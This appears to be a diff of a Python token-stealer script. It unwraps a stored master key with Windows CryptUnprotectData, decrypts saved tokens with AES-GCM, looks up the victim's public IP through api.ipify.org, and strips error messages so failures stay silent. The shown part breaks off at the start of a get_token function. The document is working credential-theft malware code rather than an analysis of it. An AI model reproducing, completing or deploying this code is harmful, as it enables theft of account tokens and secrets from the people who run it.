@@ -1,31 +1,28 @@
+import os
+import json
+import requests
 from base64 import b64decode
 from Crypto.Cipher import AES
-from json import loads
+from datetime import datetime
 from re import findall
 from urllib.request import Request, urlopen
-import requests
-import json
-import os
-from datetime import datetime
+from subprocess import Popen, PIPE
 
 tokens = []
 cleaned = []
-checker = []
 
 def decrypt(buff, master_key):
     try:
-        # Replace with PyCryptoDome AES decryption
-        return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
-    except Exception as e:
-        print(f"Error decrypting: {e}")
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except:
         return "Error"
 
 def getip():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except Exception as e:
-        print(f"Error fetching IP: {e}")
+    except:
+        pass
     return ip
 
 def get_token():
